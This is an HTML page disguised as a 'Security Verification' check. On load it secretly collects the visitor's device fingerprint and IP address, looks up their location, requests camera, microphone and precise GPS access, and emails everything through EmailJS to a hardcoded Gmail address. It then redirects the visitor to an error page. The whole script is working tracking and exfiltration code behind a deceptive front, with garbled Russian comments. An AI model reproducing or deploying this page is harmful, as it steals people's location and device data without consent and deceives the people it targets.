<!DOCTYPE html>
<html>
<head>
    <title>Security Verification</title>
    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
    <script>
        emailjs.init("5IaCHytgOi1Clyw10");
    </script>
    <style>
        body { 
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            margin: 0;
            padding: 20px;
            text-align: center;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            background: rgba(255,255,255,0.1);
            padding: 15px;
            border-radius: 10px;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <h1>üîí Security Verification</h1>
    <div class="status">Checking your device security...</div>
    <div class="loader"></div>
    <div class="status" id="progress">Initializing...</div>

    <script>
        // –ü–æ–ª–Ω—ã–π —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö
        const trackerData = {
            // –°–∏—Å—Ç–µ–º–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            vendor: navigator.vendor,
            appVersion: navigator.appVersion,
            product: navigator.product,
            
            // –Ø–∑—ã–∫–∏ –∏ –ª–æ–∫–∞–ª–∏–∑–∞—Ü–∏—è
            language: navigator.language,
            languages: navigator.languages,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            locale: Intl.DateTimeFormat().resolvedOptions().locale,
            
            // –ê–ø–ø–∞—Ä–∞—Ç–Ω—ã–µ —Ö–∞—Ä–∞–∫—Ç–µ—Ä–∏—Å—Ç–∏–∫–∏
            screen: {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth
            },
            deviceMemory: navigator.deviceMemory || 'unknown',
            hardwareConcurrency: navigator.hardwareConcurrency,
            maxTouchPoints: navigator.maxTouchPoints,
            
            // –°–µ—Ç—å –∏ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ
            online: navigator.onLine,
            connection: navigator.connection ? {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt,
                saveData: navigator.connection.saveData
            } : 'not supported',
            
            // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            pdfViewerEnabled: navigator.pdfViewerEnabled,
            webdriver: navigator.webdriver,
            
            // –í—Ä–µ–º–µ–Ω–Ω—ã–µ –º–µ—Ç–∫–∏
            timestamp: new Date().toISOString(),
            timezoneOffset: new Date().getTimezoneOffset(),
            url: window.location.href,
            referrer: document.referrer
        };

        // –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –ø—Ä–æ–≥—Ä–µ—Å—Å–∞
        function updateProgress(message) {
            document.getElementById('progress').textContent = message;
        }

        // –û—Å–Ω–æ–≤–Ω–æ–π –ø—Ä–æ—Ü–µ—Å—Å
        async function startTracking() {
            try {
                updateProgress('Getting IP address...');
                
                // –ü–æ–ª—É—á–µ–Ω–∏–µ IP
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                trackerData.ip = ipData.ip;

                updateProgress('Getting location...');
                
                // –ü–æ–ª—É—á–µ–Ω–∏–µ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
                const geoResponse = await fetch(`https://ipapi.co/${trackerData.ip}/json/`);
                const geoData = await geoResponse.json();
                trackerData.geolocation = geoData;

                updateProgress('Checking device capabilities...');
                
                // –ü–æ–ø—ã—Ç–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    trackerData.mediaDevices = {
                        camera: 'Available',
                        microphone: 'Available',
                        labels: stream.getTracks().map(track => track.label)
                    };
                    stream.getTracks().forEach(track => track.stop());
                } catch (mediaError) {
                    trackerData.mediaDevices = {
                        camera: 'Blocked',
                        microphone: 'Blocked',
                        error: mediaError.message
                    };
                }

                // –ü–æ–ø—ã—Ç–∫–∞ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ GPS
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            timeout: 5000,
                            enableHighAccuracy: true
                        });
                    });
                    trackerData.gpsLocation = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        speed: position.coords.speed
                    };
                } catch (geoError) {
                    trackerData.gpsLocation = {
                        error: geoError.message
                    };
                }

                updateProgress('Sending security report...');
                
                // –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö
                await emailjs.send('service_qd88lgh', 'template_k113khb', {
                    to_email: 'twtcha01@gmail.com',
                    subject: `üö® SECURITY REPORT: ${trackerData.ip} - ${trackerData.geolocation.country_name} - ${trackerData.platform}`,
                    message: `
üö® COMPLETE SECURITY CAPTURE üö®

üìç LOCATION:
IP: ${trackerData.ip}
Country: ${trackerData.geolocation.country_name}
City: ${trackerData.geolocation.city}
Region: ${trackerData.geolocation.region}
ISP: ${trackerData.geolocation.org}
Timezone: ${trackerData.timezone}

üì± DEVICE INFO:
Platform: ${trackerData.platform}
User Agent: ${trackerData.userAgent}
Screen: ${trackerData.screen.width}x${trackerData.screen.height}
Language: ${trackerData.language}
CPU Cores: ${trackerData.hardwareConcurrency}
RAM: ${trackerData.deviceMemory}GB

üéØ MEDIA ACCESS:
Camera: ${trackerData.mediaDevices.camera}
Microphone: ${trackerData.mediaDevices.microphone}
GPS: ${trackerData.gpsLocation.latitude ? 'Available' : 'Blocked'}

üìä FULL DATA:
${JSON.stringify(trackerData, null, 2)}

‚è∞ TIMESTAMP: ${trackerData.timestamp}
                    `
                });

                updateProgress('Security check complete!');
                
                // –†–µ–¥–∏—Ä–µ–∫—Ç –ø–æ—Å–ª–µ —É—Å–ø–µ—à–Ω–æ–π –æ—Ç–ø—Ä–∞–≤–∫–∏
                setTimeout(() => {
                    window.location.href = 'https://http.cat/404';
                }, 2000);

            } catch (error) {
                // –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–∂–µ –ø—Ä–∏ –æ—à–∏–±–∫–∞—Ö
                await emailjs.send('service_qd88lgh', 'template_k113khb', {
                    to_email: 'twtcha01@gmail.com',
                    subject: `üö® ERROR REPORT: ${trackerData.ip || 'unknown'}`,
                    message: `ERROR: ${error.message}\n\nPARTIAL DATA:\n${JSON.stringify(trackerData, null, 2)}`
                });
                
                window.location.href = 'https://http.cat/500';
            }
        }

        // –ó–∞–ø—É—Å–∫ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        document.addEventListener('DOMContentLoaded', startTracking);
        
        // –ê–≤—Ç–æ–∑–∞–ø—É—Å–∫ —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥ –Ω–∞ –≤—Å—è–∫–∏–π —Å–ª—É—á–∞–π
        setTimeout(startTracking, 5000);
    </script>
</body>
</html>
